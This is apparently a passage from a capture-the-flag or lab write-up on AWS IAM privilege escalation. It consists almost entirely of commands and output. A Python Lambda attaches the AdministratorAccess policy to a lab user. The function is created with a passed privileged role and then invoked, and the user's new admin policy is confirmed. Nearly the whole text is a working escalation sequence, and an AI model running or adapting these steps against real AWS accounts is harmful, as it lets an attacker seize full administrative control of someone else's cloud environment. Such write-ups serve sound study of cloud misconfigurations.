vim code.py
```
import boto3
def lambda_handler(event, context):
    client = boto3.client("iam")
    response = client.attach_user_policy(UserName='{PLACEHOLDER_LAB_NAME}_ApplicationDeployment',PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return response

```

zip code.zip code.py
aws lambda create-function --function-name {PLACEHOLDER_LAB_NAME}_exploit --runtime python3.8 --role arn:aws:iam::751796441543:role/ApplicationRoleManager_role --handler code.lambda_handler --zip-file fileb:///writeup/9_AWS-IAM-Privilege-escalation/code.zip
```
{
    "FunctionName": "Lab1_exploit",
    "FunctionArn": "arn:aws:lambda:us-west-2:751796441543:function:Lab1_exploit",
    "Runtime": "python3.8",
    "Role": "arn:aws:iam::751796441543:role/ApplicationRoleManager_role",
    "Handler": "code.lambda_handler",
    "CodeSize": 350,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2022-07-21T15:22:53.537+0000",
    "CodeSha256": "nvmTYqALJ416jrEITDKnvrfkJ/i7R0Fi+V+a4TIsSuI=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "525ae6f5-36c8-4997-b6d1-6f2bf2729e02",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating"
}
```

aws lambda invoke --function-name {PLACEHOLDER_LAB_NAME}_exploit --payload '{ "name": "Bob" }' response.json
```
{
    "StatusCode": 200,
    "FunctionError": "Unhandled",
    "ExecutedVersion": "$LATEST"
}
```

aws iam list-attached-user-policies --user-name {PLACEHOLDER_LAB_NAME}_ApplicationDeployment
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```
